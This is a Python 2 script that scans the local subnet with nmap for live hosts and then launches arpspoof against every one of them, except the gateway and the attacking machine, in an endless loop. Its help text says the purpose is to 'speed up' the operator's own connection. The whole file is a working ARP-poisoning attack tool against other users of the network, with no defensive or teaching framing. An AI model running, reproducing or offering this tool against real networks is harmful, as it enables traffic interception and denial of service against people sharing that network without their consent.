#!/usr/bin/python
import nmap
import optparse
import os
import sys
import subprocess
import time

def get_def_route(iface):
    """Input is interface and returns default gateway ip address
    """
    data = os.popen("/sbin/route -n ").readlines()
    for line in data:
        if line.startswith("0.0.0.0") and (iface in line):
            print "Default Gateway: " + line.split()[1]
            return line.split()[1]
    print "Error: unable to find default route"
    sys.exit(0)


def get_IP_info(iface):
    """Input in interface and returns network address in CIDR notation
    and ip address of host.
    """
    ip = None
    mask = None
    data = os.popen("/sbin/ifconfig " + iface).readlines()
    for line in data:
        if line.strip().startswith("inet addr"):
            ip = line.split(":")[1].split()[0]
            mask = line.split(":")[3].strip()
            break

    if ip == None or mask == None:
        print "Error: unable to find default IP"
        sys.exit(0)
    else:
        ipaddr = ip.split('.')
        netmask = mask.split('.')
        # ANDing IP address and Network Mask, byte by byte
        net_start = [str(int(ipaddr[x]) & int(netmask[x])) for x in range(0,4)]
        binmask = ''.join([bin(int(octet))[2:].zfill(8) for octet in netmask])
        prefix_len = str(len(binmask.rstrip('0')))
        return ('.'.join(net_start) + "/" + prefix_len, ip)


def get_online_hosts(network, exclusion):
    """Input in network address in CIDR notation and list of IP addresses
    to be excluded. And returns list of hosts that are online.
    """
    nm = nmap.PortScanner()    
    nm.scan(hosts=network, arguments='-n -sP -PE -PA21,23,80,3389')
    hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
    
    hosts = list(set(hosts) - set(exclusion))
    print "Hosts up:"
    for host in hosts: print host
    return hosts

def stop_processes(processes):
    for p in processes:
        p.terminate()

def arp_poison(victims, router, iface):
    """Input in list of ip address to be ARP poisoned as victims. Default
    gateway ip address and interface on which this network is connected.
    """
    processes = []
    try:
        for victim in victims:        
            print "Starting to arpspoof from", router, "to", victim
            processes.append(subprocess.Popen('sudo arpspoof ' + router + ' -i ' + iface + ' -t ' + victim, shell=True))
        time.sleep(120)
    except KeyboardInterrupt:
        stop_processes(processes)
        sys.exit(0)
    stop_processes(processes)
    

def main():
    parser = optparse.OptionParser("sudo python %prog")
    parser.add_option('-i', dest='iface', type='string', default='eth0', help="network interface you wanna speed up")
    parser.add_option('-e', dest='exclude', type='string', help= "specify ip[s] to be excluded seperated by comma")
    options, args = parser.parse_args()

    iface = options.iface
    if options.exclude == None:
        exclusion = list()
    else:
        exclusion = options.exclude.split(',')

    router = get_def_route(iface)
    network, ip = get_IP_info(iface)
    exclusion += [router, ip]

    while True:        
        hosts = get_online_hosts(network, exclusion)        
        arp_poison(hosts, router, iface)


if __name__ == '__main__':
    main()
